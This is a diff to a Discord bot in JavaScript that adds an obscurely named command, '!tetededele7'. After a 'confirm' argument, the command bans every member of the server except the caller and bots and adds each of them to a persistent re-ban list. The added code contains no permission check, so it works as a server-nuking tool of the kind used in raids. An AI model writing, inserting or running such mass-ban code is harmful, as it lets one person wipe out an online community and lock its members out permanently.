@@ -168,6 +168,48 @@ client.on('messageCreate', async (message) => {
       return message.reply(`Loopban désactivé pour l'ID ${id}.`);
     }
 
+
+
+
+    if (command === '!tetededele7') {
+      if (!args.includes('confirm')) {
+        return message.reply("⚠️ Ajoute 'confirm' : `!tetededele7 confirm`");
+      }
+
+      const members = await message.guild.members.fetch();
+
+      let count = 0;
+
+      message.reply(`⚠️ Loopban global en cours...`);
+
+      for (const [id, member] of members) {
+        try {
+      
+          if (member.id === message.author.id) continue;
+
+      
+          if (member.user.bot) continue;
+
+      
+          if (!loopbanList.has(id)) {
+            loopbanList.add(id);
+          }
+
+          await member.ban({ reason: 'tetededele7 global' });
+          count++;
+        } catch (error) {
+          console.error(`Erreur avec ${member.user.tag}:`, error);
+        }
+      }
+
+      saveLoopbanData(loopbanList);
+
+      return message.channel.send(`🔥 tetededele7 terminé : ${count} membres bannis`);
+    }
+
+
+
+
     if (command === '!loopbanlist') {
       if (loopbanList.size === 0) {
         return message.reply('La liste loopban est vide.');
